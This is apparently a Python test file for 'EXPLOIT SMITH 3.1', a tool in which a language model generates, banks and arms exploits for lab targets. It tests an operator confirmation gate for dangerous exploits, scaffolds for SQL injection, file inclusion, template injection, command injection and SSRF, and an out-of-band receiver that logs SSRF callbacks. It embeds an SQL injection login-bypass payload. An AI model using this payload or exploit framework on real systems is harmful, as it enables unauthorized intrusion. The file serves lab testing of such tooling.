"""EXPLOIT SMITH 3.1 — operator gate, scaffold, OOB receiver.

  GATE      — exploit_arm refuses loud/strike without confirm=='YES'
             (nday law), arms with it; safe/active weapons arm freely
  SCAFFOLD  — every class emits wire-clean code (static_scan passes)
             with TODO slots; unknown class → honest error
  OOB       — the lab receiver logs nonce hits (the blind's receipt):
             SSRF via vulnlab /fetch produces a receipt line
"""
import importlib.util
import json
import os
import sys
import tempfile
import threading
from http.server import HTTPServer

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from tools import discover
discover()

from core import exploit_bank as bank
from tools.exploit_smith import exploit_arm, exploit_smith, exploit_bank_list
from tools.exploit_scaffold import exploit_scaffold

GOOD = '''
from tools._exploit_lib import verdict
from tools._transport import fetch

def run(url, **kw):
    from urllib.parse import urlencode
    target = url.rstrip("/").split("/login")[0] + "/login"
    q = urlencode({"user": "' OR 1=1 --", "pass": "x"})
    r = fetch(target + "?" + q, timeout=10)
    if r["status"] == 200 and "flag{" in r["body"]:
        return verdict("c", True, "flag", evidence=[r["body"][:80]])
    return verdict("c", False, "no")
'''


def _tmp_bank():
    tmp = tempfile.mkdtemp()
    bank.BANK_DIR = os.path.join(tmp, "exploits")
    bank.INDEX = os.path.join(bank.BANK_DIR, "_index.json")


def test_operator_gate_on_arm():
    _tmp_bank()
    # a STRIKE weapon: deposit directly (proof already pinned)
    dep = bank.deposit(vuln_class="sqli", code=GOOD, danger="strike",
                       stack_match="gate-test",
                       verify_contract={"mode": "target",
                                        "expect_contains": ["flag{"]},
                       proof="pinned proof")
    assert dep.get("ok"), dep
    bid = dep["id"]
    # arm WITHOUT confirm → GATED (fail-closed)
    a = json.loads(exploit_arm(bid))
    assert a["exploitable"] is False and a.get("gated") is True
    # arm WITH confirm='YES' → live
    a2 = json.loads(exploit_arm(bid, confirm="YES"))
    assert a2["exploitable"] is True
    # a SAFE weapon: no gate — arms freely
    dep2 = bank.deposit(vuln_class="sqli", code=GOOD, danger="safe",
                        stack_match="gate-test",
                        verify_contract={"mode": "target",
                                        "expect_contains": ["flag{"]},
                        proof="pinned")
    a3 = json.loads(exploit_arm(dep2["id"]))
    assert a3["exploitable"] is True
    bank.recall(bid)
    bank.recall(dep2["id"])


def test_scaffold_emits_wire_clean():
    for cls in ("sqli", "lfi", "ssti", "cmdi", "ssrf"):
        s = json.loads(exploit_scaffold(cls))
        assert s["exploitable"] is True, cls
        code = s["code"]
        # the scaffold itself passes the bank's static scan (wire-clean)
        assert bank.static_scan(code) is None, f"{cls}: not wire-clean"
        # and it carries the TODO slots the LLM must adapt
        assert "TODO" in code, cls
    # unknown class → honest refusal
    bad = json.loads(exploit_scaffold("nonsense"))
    assert bad["exploitable"] is False


def test_oob_receiver_receipt():
    # the lab receiver: load, clean log, start, fire one SSRF via the
    # vulnlab (running from test_exploit_smith's pattern), read receipt
    here = os.path.dirname(os.path.abspath(__file__))
    rec_path = os.path.join(here, "..", "lab", "oob_receiver.py")
    spec = importlib.util.spec_from_file_location("oob_rec", rec_path)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    if os.path.exists(m.LOG):
        os.unlink(m.LOG)
    srv = HTTPServer(("127.0.0.1", 0), m.H)
    port = srv.server_address[1]
    # point the SSRF at OUR ephemeral port (the receiver logs any path)
    # — the vulnlab /fetch makes the outbound call; receiver = receipt
    from tools._transport import fetch as _f
    from urllib.parse import urlencode
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    # NOTE: no vulnlab dependency here — we fire the RECEIVER directly
    # through the transport (the receipt semantics are what we test:
    # a hit under our nonce lands in the log)
    nonce = "test123nonce"
    r = _f(f"http://127.0.0.1:{port}/hit/{nonce}", timeout=5)
    import time
    time.sleep(0.3)
    hits = [json.loads(ln) for ln in open(m.LOG, encoding="utf-8")]
    srv.shutdown()
    assert r["status"] == 200
    assert hits and hits[-1]["nonce"] == nonce, "no receipt logged"
